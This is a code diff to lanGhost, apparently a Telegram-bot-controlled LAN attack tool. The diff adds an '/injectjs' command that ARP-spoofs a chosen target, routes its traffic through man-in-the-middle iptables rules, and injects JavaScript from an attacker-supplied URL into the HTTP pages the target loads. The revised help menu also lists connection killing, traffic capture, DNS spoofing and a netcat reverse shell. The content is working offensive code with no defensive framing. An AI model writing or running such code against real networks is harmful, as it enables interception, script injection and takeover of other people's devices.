@@ -455,6 +455,21 @@ def stopAttack(ID):
         DBconn.commit()
         DBconn.close()
 
+    elif atype == "injectjs":
+        iptables("stopmitm", target=target)
+
+        DBconn = sqlite3.connect(script_path + "lanGhost.db")
+        DBcursor = DBconn.cursor()
+        DBcursor.execute("CREATE TABLE IF NOT EXISTS lanGhost_js (attackid TEXT, target TEXT, jsurl TEXT)")
+        DBconn.commit()
+        DBconn.close()
+
+        DBconn = sqlite3.connect(script_path + "lanGhost.db")
+        DBcursor = DBconn.cursor()
+        DBcursor.execute("DELETE FROM lanGhost_js WHERE attackid=?", [str(ID)])
+        DBconn.commit()
+        DBconn.close()
+
     elif atype == "spoofdns":
         iptables("stopspoofdns", target=target)
 
@@ -845,6 +860,68 @@ def msg_spoofdns(bot, update, args):
         print("[!!!] " + str(traceback.format_exc()))
         bot.send_message(chat_id=update.message.chat_id, text="❌ Whooops, something went wrong... Please try again.")
 
+def msg_injectjs(bot, update, args):
+    global admin_chatid
+    if not str(update.message.chat_id) == str(admin_chatid):
+        return
+    try:
+        if len(args) < 2:
+            bot.send_message(chat_id=update.message.chat_id, text="⚠️ Usage: /injectjs [TARGET-IP] [JS-FILE-URL]")
+            return
+
+        target_ip = args[0]
+        jsurl = args[1]
+
+        global latest_scan
+        hosts = latest_scan[:]
+        target_mac = False
+        for host in hosts:
+            if host[0] == target_ip:
+                target_mac = host[1]
+        if not target_mac:
+            bot.send_message(chat_id=update.message.chat_id, text="⚠️ Target host is not up.")
+            return
+
+        try:
+            response = urllib.request.urlopen(urllib.request.Request(jsurl, headers={'User-Agent': 'Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.36'}))
+        except:
+            bot.send_message(chat_id=update.message.chat_id, text="⚠️ JS-FILE-URL is not valid... Please try again.")
+            print("[!!!] " + str(traceback.format_exc()))
+            return
+
+        target = [target_ip, target_mac]
+
+        DBconn = sqlite3.connect(script_path + "lanGhost.db")
+        DBcursor = DBconn.cursor()
+        DBcursor.execute("CREATE TABLE IF NOT EXISTS lanGhost_js (attackid TEXT, target TEXT, jsurl TEXT)")
+        DBconn.commit()
+        DBconn.close()
+
+        iptables("mitm", target=target[0])
+        if not attackManager("isattacked", target=target_ip):
+            ID = attackManager("new", attack_type="injectjs", target=target[0])
+            arp_thread = threading.Thread(target=arpSpoof, args=[target])
+            arp_thread.daemon = True
+            arp_thread.start()
+        else:
+            ID = attackManager("new", attack_type="injectjs", target=target[0])
+
+        jsurl64 = base64.b64encode(jsurl.encode("UTF-8"))
+
+        DBconn = sqlite3.connect(script_path + "lanGhost.db")
+        DBcursor = DBconn.cursor()
+        DBcursor.execute("INSERT INTO lanGhost_js VALUES (?, ?, ?)", [str(ID), target[0], jsurl64])
+        DBconn.commit()
+        DBconn.close()
+
+        bot.send_message(chat_id=update.message.chat_id, text="Starting attack with ID: " + str(ID))
+        bot.send_message(chat_id=update.message.chat_id, text="Type /stop " + str(ID) + " to stop the attack.")
+        bot.send_message(chat_id=update.message.chat_id, text="🔥 Injecting JavaScript for " + target[0] + "...")
+    except:
+        print("[!!!] " + str(traceback.format_exc()))
+        bot.send_message(chat_id=update.message.chat_id, text="❌ Whooops, something went wrong... Please try again.")
+
+
 def msg_help(bot, update):
     global admin_chatid
     if not str(update.message.chat_id) == str(admin_chatid):
@@ -853,9 +930,9 @@ def msg_help(bot, update):
     try:
         bot.send_message(chat_id=update.message.chat_id, text="👻 lanGhost help:\n\n/scan - Scan LAN network\n/scanip [TARGET-IP] - Scan a specific IP address.\n/kill [TARGET-IP] - Stop the target's network connection.\n" +\
                                                                 "/mitm [TARGET-IP] - Capture HTTP/DNS traffic from target.\n/replaceimg [TARGET-IP] - Replace HTTP images requested by target.\n" +\
-                                                                "/spoofdns [TARGET-IP] [DOMAIN] [FAKE-IP] - Spoof DNS records for target.\n/attacks - View currently running attacks.\n" +\
-                                                                "/stop [ATTACK ID] - Stop a currently running attack.\n/restart - Restart lanGhost.\n/reversesh [TARGET-IP] [PORT] - Create a netcat reverse shell to target.\n" +\
-                                                                "/help - Display this menu.\n/ping - Pong.")
+                                                                "/injectjs [TARGET-IP] [JS-FILE-URL] - Inject JavaScript into HTTP pages requested by target.\n/spoofdns [TARGET-IP] [DOMAIN] [FAKE-IP] - Spoof DNS records for target.\n" +\
+                                                                "/attacks - View currently running attacks.\n/stop [ATTACK ID] - Stop a currently running attack.\n/restart - Restart lanGhost.\n" +\
+                                                                "/reversesh [TARGET-IP] [PORT] - Create a netcat reverse shell to target.\n/help - Display this menu.\n/ping - Pong.")
     except:
         print("[!!!] " + str(traceback.format_exc()))
         bot.send_message(chat_id=update.message.chat_id, text="❌ Whooops, something went wrong... Please try again.")
@@ -1001,6 +1078,8 @@ def main():
     dispatcher.add_handler(reversesh_handler)
     scanip_handler = CommandHandler('scanip', msg_scanip, pass_args=True)
     dispatcher.add_handler(scanip_handler)
+    injectjs_handler = CommandHandler('injectjs', msg_injectjs, pass_args=True)
+    dispatcher.add_handler(injectjs_handler)
 
     dispatcher.add_handler(MessageHandler(Filters.text, msg_unknown))
     dispatcher.add_handler(MessageHandler(Filters.command, msg_unknown))
